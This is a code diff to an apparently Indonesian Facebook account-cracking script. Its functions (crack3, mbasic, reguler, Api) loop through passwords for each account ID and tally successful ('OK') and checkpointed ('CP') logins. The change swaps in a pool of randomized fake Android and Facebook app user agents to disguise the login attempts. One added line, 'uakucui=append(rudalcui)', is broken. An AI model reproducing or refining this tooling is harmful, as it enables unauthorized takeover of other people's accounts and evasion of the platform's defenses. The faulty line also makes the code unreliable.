@@ -71,6 +71,7 @@ wa = Console()
 taplikasi=[]
 gabriel=[]
 uidl =[]
+uakucui=[]
 opsi=[]
 uidf=[]
 free=[]
@@ -99,17 +100,18 @@ def ua_krek():
         ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Vision3 Build/MRA58K) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/Vision;FBBD/Vision;FBDV/Vision3;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")
         return ua
 
-def ua_crack():
-		az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
-		smart = str(random.randint(8, 12))
-		chrome3 = str(random.randint(100, 300))
-		chrome4 = str(random.randint(1000, 9000))
-		builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
-		chrome6 = str(random.randint(100000, 900000))
-		#ngentod = "Mozilla/5.0 (Linux; Android "+smart+"; Redmi Note 7 Build/QKQ1."+chrome6+"."+chrome3+"; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0."+chrome4+"."+chrome3+" Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/227.0.0.5.115;]"
-		mikaz = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
-		#ngentod = f"Mozilla/5.0 (Linux; Android  {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; Micromax E484 Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.23.{chrome3};]"
-		return mikaz
+for crack in range(200):
+	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
+	smart = str(random.randint(8, 12))
+	chrome3 = str(random.randint(100, 300))
+	chrome4 = str(random.randint(1000, 9000))
+	builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
+	chrome6 = str(random.randint(100000, 900000))
+	ngentod = "Mozilla/5.0 (Linux; Android "+smart+"; Redmi Note 7 Build/QKQ1."+chrome6+"."+chrome3+"; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0."+chrome4+"."+chrome3+" Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/227.0.0.5.115;]"
+	ngentodd = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
+	ngentoddd = f"Mozilla/5.0 (Linux; Android  {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; Micromax E484 Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.23.{chrome3};]"
+	rudalcui=random.choice([ngentod,ngentodd,ngentoddd])
+	uakucui=append(rudalcui)
 
 for xd in range(10000):
     rr = random.randint; rc = random.choice
@@ -1293,7 +1295,7 @@ def crack3(idf,pwv):
     global loop,ok,cp
     prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
-    ua = random.choice(free)
+    ua = random.choice(uakucui)
     ua2 = random.choice(free)
     ses = requests.Session()
     for pw in pwv:
@@ -1355,7 +1357,7 @@ def mbasic(idf,pwv):
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	prog.update(des,description=f" {K2}•{H2} VALIDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua=random.choice(free)
+	ua=random.choice(uakucui)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
@@ -1390,7 +1392,7 @@ def reguler(idf,pwv):
 	rr = random.randint
 	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua=random.choice(free)
+	ua=random.choice(uakucui)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
@@ -1452,7 +1454,7 @@ def Api(idf,pwv):
     war = str(random.choice([H2,K2,B2,O2,]))
     prog.update(des,description=f"{H2}Crack Api {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {war}{str(loop)}/{len(id2)}")
     prog.advance(des)
-    rudalxd = ua_krek()
+    rudalxd = random.choice(uakucui)
     ses = requests.Session()
     for pw in pwv:
         try:
